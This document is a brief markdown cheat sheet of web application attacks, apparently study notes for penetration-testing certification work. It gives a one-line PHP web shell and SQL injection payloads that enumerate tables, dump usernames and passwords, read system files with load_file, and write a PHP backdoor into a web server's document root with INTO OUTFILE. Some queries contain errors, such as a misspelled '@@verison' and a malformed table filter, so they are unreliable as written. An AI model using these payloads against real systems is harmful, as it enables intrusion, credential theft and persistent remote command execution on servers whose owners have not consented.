# Web Application Attacks

## PHP

### Simple Web Shell
```php
<?php system($_REQUEST["cmd"]); ?>
```
- can also try `exec` and `shell_exec`

## SQL Injection
- fuzz with `'` and `' or 1=1 -- -` style queries to bypass login or cause errors

### Steps
1. Find injections syntax
2. `order by x` until error
3. `union all select 1,2,3,..,x` to confirm
4. use visible indexes in select to pull other data
  - `?id=1 union all select 1,2,@@verison`

### MySQL
```sql
union all select 1,2,3, table_name from information_schema.tables
union all select 1,2,3, table_name from information_schema.tables='users'
select 1, username, password from users
```

#### LOADFILE
- can load files into mysql through sql injection
- good for pulling configuration files that will be contain issues or creds
```sql
union all select 1,2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

#### OUTFILE
- print content of query into file
- good for printing to webserver document root for php shell execution or configuration updates
```sql
union all select 1,2, "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE('c:/xampp/htdocs/backdoor.php')
```

### Other resources
[general-sqli](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
[mssql](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
